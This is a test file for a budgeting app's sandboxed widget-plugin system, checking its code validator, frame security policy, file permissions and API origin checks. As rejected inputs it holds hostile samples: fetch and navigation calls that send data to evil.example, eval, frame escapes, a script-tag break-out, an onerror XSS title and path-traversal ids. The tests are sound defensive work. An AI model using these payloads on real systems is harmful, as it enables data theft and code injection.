import { mkdtempSync, readFileSync, rmSync, statSync } from 'node:fs'
import type { AddressInfo } from 'node:net'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, describe, expect, it } from 'vitest'
import { createGatewayServer, type GatewayOptions } from '../app'
import { PLUGIN_FRAME_CSP, buildPluginFrameHtml } from './frame'
import { createPluginService } from './service'
import { STARTER_PLUGINS } from './starters'
import { createPluginFileStore, createPluginMemoryStore } from './store'
import { MAX_INSTALLED_PLUGINS, validatePluginCode } from './validate'

const GOOD = `function render(root, data, helpers) {
  root.appendChild(helpers.el('p', { className: 'n' }, 'Spent ' + helpers.money(data.summary ? data.summary.spent : 0)))
}`

const draftBody = (over: Record<string, unknown> = {}) => ({ name: 'Spent so far', description: 'What this month cost so far', code: GOOD, ...over })

describe('validatePluginCode', () => {
  it('passes every built-in starter', () => {
    for (const s of STARTER_PLUGINS) expect(validatePluginCode(s.code, s.css), s.id).toEqual({ ok: true })
  })

  it('passes a plain render function', () => {
    expect(validatePluginCode(GOOD)).toEqual({ ok: true })
  })

  it.each([
    ['network', `function render(r){ fetch('https://evil.example/?d=' + 1) }`, 'plugin/no-network'],
    ['eval', `function render(r){ eval('1') }`, 'plugin/no-dynamic-exec'],
    ['Function constructor', `function render(r){ new Function('return 1')() }`, 'plugin/no-dynamic-exec'],
    ['parent window', `function render(r){ parent.document.body }`, 'plugin/no-frame-escape'],
    ['top window', `function render(r){ top.location = 'x' }`, 'plugin/no-frame-escape'],
    ['postMessage', `function render(r){ window.postMessage('x', '*') }`, 'plugin/no-frame-escape'],
    ['localStorage', `function render(r){ localStorage.getItem('fundbun') }`, 'plugin/no-storage'],
    ['navigating its frame', `function render(r, d){ location = 'https://evil.example/?d=' + d.summary.spent }`, 'plugin/no-navigation'],
    ['window.location', `function render(r){ window.location.href = 'https://evil.example' }`, 'plugin/no-navigation'],
    ['a link clicked from code', `function render(r, d, h){ var a = h.el('a', { href: 'https://evil.example' }); r.appendChild(a); a.click() }`, 'plugin/no-navigation'],
    ['a computed global', `function render(r){ self['loc' + 'ation'] = 'x' }`, 'plugin/no-global-lookup'],
    ['a closing script tag', `function render(r){ r.textContent = 1 } </script><script>alert(1)`, 'plugin/no-script-close-tag'],
  ])('refuses %s', (_label, code, rule) => {
    const r = validatePluginCode(code)
    expect(r.ok).toBe(false)
    if (!r.ok) expect(r.issues.map((i) => i.rule)).toContain(rule)
  })

  it('still allows data.history and a word like "location" in text', () => {
    const code = `function render(root, data) { root.textContent = data.history.length + ' months, location: home' }`
    expect(validatePluginCode(code)).toEqual({ ok: true })
  })

  it('ignores forbidden words inside strings and comments', () => {
    const code = `// do not fetch anything
function render(root, data, helpers) { root.textContent = 'on top of your budget, no fetch' }`
    expect(validatePluginCode(code)).toEqual({ ok: true })
  })

  it('needs a render function and valid syntax', () => {
    expect(validatePluginCode('const x = 1').ok).toBe(false)
    expect(validatePluginCode('function render(root) { if ( }').ok).toBe(false)
  })

  it('refuses CSS that loads anything from outside', () => {
    expect(validatePluginCode(GOOD, `@import url(https://evil.example/x.css);`).ok).toBe(false)
    expect(validatePluginCode(GOOD, `.n { background: url(https://evil.example/p.png) }`).ok).toBe(false)
    expect(validatePluginCode(GOOD, `.n { color: var(--accent) }`)).toEqual({ ok: true })
  })
})

describe('plugin service', () => {
  it('drafts nothing while Creator Mode is off', () => {
    const svc = createPluginService({ store: createPluginMemoryStore() })
    expect(svc.draft(draftBody())).toMatchObject({ ok: false, status: 403, error: 'creator_disabled' })
    expect(svc.installStarter(STARTER_PLUGINS[0].id)).toMatchObject({ ok: false, status: 403 })
  })

  it('stages a draft, installs it only on request, then removes it', () => {
    const svc = createPluginService({ store: createPluginMemoryStore({ enabled: true }) })
    const d = svc.draft(draftBody())
    if (!d.ok) throw new Error(d.message)
    expect(d.draft.mode).toBe('create')
    expect(d.draft.manifest.id).toBe('spent-so-far')
    expect(svc.state().plugins).toHaveLength(0)

    const inst = svc.installDraft(d.draft.draftId)
    expect(inst).toMatchObject({ ok: true, plugin: { id: 'spent-so-far', revision: 1, enabled: true } })
    expect(svc.state().plugins.map((p) => p.id)).toEqual(['spent-so-far'])
    // a draft installs once
    expect(svc.installDraft(d.draft.draftId)).toMatchObject({ ok: false, status: 404 })

    const again = svc.draft(draftBody({ id: 'spent-so-far' }))
    expect(again).toMatchObject({ ok: true, draft: { mode: 'update' } })

    expect(svc.uninstall('spent-so-far')).toMatchObject({ ok: true })
    expect(svc.state().plugins).toHaveLength(0)
  })

  it('refuses bad code with the issues the model needs to fix it', () => {
    const svc = createPluginService({ store: createPluginMemoryStore({ enabled: true }) })
    const r = svc.draft(draftBody({ code: `function render(r){ fetch('x') }` }))
    expect(r).toMatchObject({ ok: false, status: 400, error: 'plugin_validation_failed' })
    if (!r.ok) expect(r.issues?.[0]).toMatchObject({ rule: 'plugin/no-network', fix: expect.any(String) })
  })

  it('refuses ids that could leave the plugin folder', () => {
    const svc = createPluginService({ store: createPluginMemoryStore({ enabled: true }) })
    for (const id of ['../etc', 'a/b', '..', 'UPPER', '']) {
      expect(svc.get(id)).toMatchObject({ ok: false, status: 400 })
      expect(svc.uninstall(id)).toMatchObject({ ok: false, status: 400 })
    }
    expect(svc.draft(draftBody({ id: '../../x' }))).toMatchObject({ ok: false, status: 400 })
  })

  it(`keeps at most ${MAX_INSTALLED_PLUGINS} widgets`, () => {
    const svc = createPluginService({ store: createPluginMemoryStore({ enabled: true }) })
    for (let i = 0; i < MAX_INSTALLED_PLUGINS; i++) {
      const d = svc.draft(draftBody({ name: `Widget ${i}` }))
      if (!d.ok) throw new Error(d.message)
      expect(svc.installDraft(d.draft.draftId).ok).toBe(true)
    }
    expect(svc.draft(draftBody({ name: 'One too many' }))).toMatchObject({ ok: false, status: 409 })
  })

  it('turning Creator Mode off drops drafts and stops serving widgets', () => {
    const changes: boolean[] = []
    const svc = createPluginService({ store: createPluginMemoryStore({ enabled: true }), onCreatorModeChange: (on) => changes.push(on) })
    const d = svc.draft(draftBody())
    if (!d.ok) throw new Error(d.message)
    expect(svc.installStarter(STARTER_PLUGINS[0].id).ok).toBe(true)
    svc.setEnabled(false)
    expect(changes).toEqual([false])
    expect(svc.installDraft(d.draft.draftId)).toMatchObject({ ok: false, status: 403 })
    expect(svc.renderInstalledFrame(STARTER_PLUGINS[0].id, 'tok12345')).toMatchObject({ ok: false, status: 403 })
  })

  it('does not serve a switched-off widget', () => {
    const svc = createPluginService({ store: createPluginMemoryStore({ enabled: true }) })
    const id = STARTER_PLUGINS[0].id
    svc.installStarter(id)
    expect(svc.renderInstalledFrame(id, 'tok12345').ok).toBe(true)
    svc.updateMeta(id, { enabled: false })
    expect(svc.renderInstalledFrame(id, 'tok12345')).toMatchObject({ ok: false, status: 403 })
  })
})

describe('plugin frame', () => {
  it('escapes the title and cannot be closed early by the code', () => {
    const html = buildPluginFrameHtml({ id: 'x1', name: '<img src=x onerror=alert(1)>', code: `function render(){ '</script>' }`, css: '' }, 'tok12345')
    expect(html).not.toContain('<img src=x')
    expect(html.match(/<\/script>/gi)).toHaveLength(1)
  })

  it('blocks every network request', () => {
    expect(PLUGIN_FRAME_CSP).toContain("default-src 'none'")
    expect(PLUGIN_FRAME_CSP).toContain("connect-src 'none'")
    // opened on its own (not in the app's iframe) it is still sandboxed
    expect(PLUGIN_FRAME_CSP).toContain('sandbox allow-scripts')
  })
})

describe('plugin file store', () => {
  const dirs: string[] = []
  afterEach(() => dirs.splice(0).forEach((d) => rmSync(d, { recursive: true, force: true })))

  it('writes each widget to its own folder, readable only by the user', () => {
    const home = mkdtempSync(join(tmpdir(), 'fundbun-plugins-'))
    dirs.push(home)
    const svc = createPluginService({ store: createPluginFileStore(home) })
    svc.setEnabled(true)
    const id = STARTER_PLUGINS[0].id
    expect(svc.installStarter(id).ok).toBe(true)
    const file = join(home, 'plugins', id, 'widget.js')
    expect(readFileSync(file, 'utf8')).toBe(STARTER_PLUGINS[0].code)
    expect(statSync(file).mode & 0o077).toBe(0)
    // a fresh service over the same folder sees the same state
    const again = createPluginService({ store: createPluginFileStore(home) })
    expect(again.isEnabled()).toBe(true)
    expect(again.state().plugins.map((p) => p.id)).toEqual([id])
  })
})

describe('/api/plugins/* routes', () => {
  const running: (() => Promise<void>)[] = []
  afterEach(async () => {
    await Promise.all(running.splice(0).map((c) => c()))
  })
  async function start(opts: Partial<GatewayOptions> = {}) {
    const server = createGatewayServer({ provider: null, rateLimitRpm: 1000, ...opts })
    await new Promise<void>((r) => server.listen(0, '127.0.0.1', r))
    const port = (server.address() as AddressInfo).port
    running.push(() => new Promise<void>((r) => {
      server.closeAllConnections()
      server.close(() => r())
    }))
    return `http://127.0.0.1:${port}`
  }

  it('are not served without the desktop plugin engine', async () => {
    const base = await start()
    expect((await fetch(`${base}/api/plugins/state`)).status).toBe(404)
  })

  it('refuse a request from another site', async () => {
    const base = await start({ plugins: createPluginService({ store: createPluginMemoryStore({ enabled: true }) }) })
    const res = await fetch(`${base}/api/plugins/mode`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', Origin: 'https://evil.example' },
      body: JSON.stringify({ enabled: true }),
    })
    expect(res.status).toBe(403)
  })

  it('refuse a change from a program that is not the app (no Origin)', async () => {
    const plugins = createPluginService({ store: createPluginMemoryStore() })
    const base = await start({ plugins })
    const res = await fetch(`${base}/api/plugins/mode`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ enabled: true }) })
    expect(res.status).toBe(403)
    expect(plugins.isEnabled()).toBe(false)
    // the app's own origin with a form-style body is refused too
    const form = await fetch(`${base}/api/plugins/mode`, { method: 'POST', headers: { 'Content-Type': 'text/plain', Origin: base }, body: '{"enabled":true}' })
    expect(form.status).toBe(415)
    expect(plugins.isEnabled()).toBe(false)
    // reading is fine
    expect((await fetch(`${base}/api/plugins/state`)).status).toBe(200)
  })

  it('serve a widget frame with its own locked-down CSP', async () => {
    const plugins = createPluginService({ store: createPluginMemoryStore({ enabled: true }) })
    plugins.installStarter(STARTER_PLUGINS[0].id)
    const base = await start({ plugins })
    const res = await fetch(`${base}/api/plugins/installed/${STARTER_PLUGINS[0].id}/frame?token=abcdef123456`)
    expect(res.status).toBe(200)
    expect(res.headers.get('content-security-policy')).toBe(PLUGIN_FRAME_CSP)
    expect(await res.text()).toContain('"abcdef123456"')
    expect((await fetch(`${base}/api/plugins/installed/${STARTER_PLUGINS[0].id}/frame`)).status).toBe(400)
  })
})

describe('plugin frame script', () => {
  it('is valid JavaScript once inlined (template escapes survive)', async () => {
    const vm = await import('node:vm')
    const html = buildPluginFrameHtml({ id: 'x1', name: 'X', code: GOOD, css: '' }, 'tok12345')
    const script = /<script>([\s\S]*)<\/script>/.exec(html)?.[1] ?? ''
    expect(script.length).toBeGreaterThan(100)
    expect(() => new vm.Script(script)).not.toThrow()
    expect(script).toContain('data:text\\/html')
  })
})
